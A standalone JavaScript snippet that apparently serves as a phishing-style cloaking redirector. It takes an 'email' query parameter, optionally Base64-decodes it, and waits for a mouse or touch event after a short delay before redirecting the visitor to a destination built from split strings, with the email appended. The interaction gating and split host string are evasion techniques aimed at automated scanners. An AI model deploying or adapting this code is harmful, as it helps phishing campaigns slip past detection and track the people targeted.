<script>
    function getQueryVariable(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split('&');
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split('=');
            if (decodeURIComponent(pair[0]) === variable) {
                return decodeURIComponent(pair[1]);
            }
        }
        console.log('Query variable %s not found', variable);
        return false;
    }

    function isBase64(str) {
        try {
            // Check if string is a valid Base64 encoded
            return btoa(atob(str)) === str;
        } catch (err) {
            return false;
        }
    }

    function decodeBase64(str) {
        // Decode a Base64 encoded string
        return decodeURIComponent(atob(str).split('').map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
    }

    function checkHumanInteraction() {
        let startTime = Date.now();
        let interactionDetected = false;

        document.addEventListener('touchstart', function() {
            if (!interactionDetected && (Date.now() - startTime > 300)) {
                interactionDetected = true;
                attemptRedirect();
            }
        });

        document.addEventListener('mousemove', function() {
            if (!interactionDetected && (Date.now() - startTime > 300)) {
                interactionDetected = true;
                attemptRedirect();
            }
        });
    }

    function attemptRedirect() {
        var redirectUrl = constructLink();
        console.log("Redirecting to:", redirectUrl);
        setTimeout(function() {
            window.location.href = redirectUrl;
        }, 300);
    }

    function constructLink() {
        var base = "https://facebook";
        var path = ".com";
        var email = getQueryVariable('email');

        // Check if the email needs decoding from Base64
        if (email && isBase64(email)) {
            email = decodeBase64(email);
        }
        
        // Encode the email for URL safety
        return base + path + (email ? '/' + encodeURIComponent(email) : "");
    }

    document.addEventListener('DOMContentLoaded', checkHumanInteraction);
</script>
